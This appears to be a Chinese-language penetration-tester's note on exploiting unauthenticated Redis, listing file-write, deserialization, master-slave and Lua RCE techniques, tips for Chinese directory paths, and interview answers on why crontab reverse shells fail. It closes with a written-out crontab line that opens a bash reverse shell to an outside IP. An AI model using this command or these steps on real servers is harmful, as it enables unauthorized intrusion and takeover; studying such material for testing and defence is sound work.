# 参考链接
[Redis漏洞利用 -- 全](https://mp.weixin.qq.com/s/ungjainqdPhA_dDOOMKn4Q)

[Redis RCE 文章 @浅蓝](https://paper.seebug.org/1169/)

[纸上得来终觉浅 -- Redis 个人总结](http://www.wangqingzheng.com/anquanke/84/255584.html)

# 漏洞原理
Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。

攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。

如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。

# 利用方式

- 写文件
  - windows
    - 开机自启动目录
  - Linux
    - crontab
    - SSH key
  - Webshell

- 反序列化
  - java反序列化
    - jackson
    - fastjson
    - jdk/Hessian反序列化
    - [shiro反序列化](https://xz.aliyun.com/t/11198)
  - python反序列化
  - php反序列化

- 主从复制RCE

- Lua RCE

# 中文路径
某次遇到了web存在中文路径问题，如果直接`config set dir "中文"`的话会报错。

可以自己在本地搭建个Redis， 把Redis所有文件放到对应的中文文件夹里，经测试Linux下转义跟Windows不同，要根据靶机系统选择对应的环境。

## Windows
  - 使用`config get dir`查看配置文件路径，就是一个对中文编码后地址。

<div align=center><img src="https://user-images.githubusercontent.com/84888757/173911780-118172c6-177d-4ad6-b82c-feebe3cd7930.png"/></div>

  - 或者直接下使用python2的`repr`函数进行十六进制转义。

<div align=center><img src="https://user-images.githubusercontent.com/84888757/173911904-35d62fa0-2a7d-4848-9f28-6852ecfb8b0f.png"/></div>

## Linux
  - 使用`config get dir`查看配置文件路径，就是一个对中文编码后地址。

<div align=center><img src="https://user-images.githubusercontent.com/84888757/173912546-10e8b85e-1c30-4ed7-8c93-854009e5e1c5.png"/></div>

  - 或者直接下使用python2的`repr`函数进行十六进制转义。

<div align=center><img src="https://user-images.githubusercontent.com/84888757/173914914-7c505662-aff5-4dc1-83d0-b0847779e80c.png"/></div>


# 面试题
- Redis计划任务反弹shell失败原因？
  - 目标机器不出网
  - Redis向计划任务文件里写内容出现乱码而导致语法错误，这些乱码来自redis的缓存数据，无法避免，centos会忽略乱码去执行格式正确的任务计划，而ubuntu不会忽略这些乱码，导致命令执行失败。
  - 权限不足，不是以root权限启动的redis
  - 容器化启动redis，没有计划任务文件
    - ![image](https://user-images.githubusercontent.com/84888757/163797414-38a0ef2b-aeab-4df5-8d6b-531c84e1f271.png)

  - 因为默认 redis 写文件后是 644 权限，但是 Ubuntu 要求执行定时任务文件 `/var/spool/cron/crontabs/<username>` 权限必须是 600 才会执行（即rw），否则会报错 `(root) INSECURE MODE (mode 0600 expected)`，而 Centos 的定时任务文件 `/var/spool/cron/<username>` 权限 644 也可以执行
  - 由于系统的不同，crontrab 定时文件位置也不同
    - Centos 的定时任务文件在 `/var/spool/cron/<username>`
    - Ubuntu 的定时任务文件在 `/var/spool/cron/crontabs/<username>`
  
  - 在ubuntu中 `/bin/sh` 这个软链接指向了 `dash`，而我们反弹 shell 使用的 shell 环境应该是 bash

    在centos中`/bin/sh` 这个软链接指向了 `bash`
    
    - ![image](https://user-images.githubusercontent.com/84888757/172678636-d1fb9f00-feab-4c1b-a2a1-ae3fcfb9aaf4.png)

    - ![image](https://user-images.githubusercontent.com/84888757/172678982-58ebf240-70f8-4402-ad4e-31d69fd6b18c.png)
    
    - 可通过修改软链接的方式成功反弹shell，但实战中未拿到服务器权限无法修改软链接，故可使用如下命令，不用修改链接指向，直接在 sh 下执行 bash -c
      - `*/1 * * * *  bash -c "bash -i  >&/dev/tcp/123.207.x.x/1234 0>&1"`
    
    - [参考链接](https://www.dazhuanlan.com/knight9001/topics/1061140)

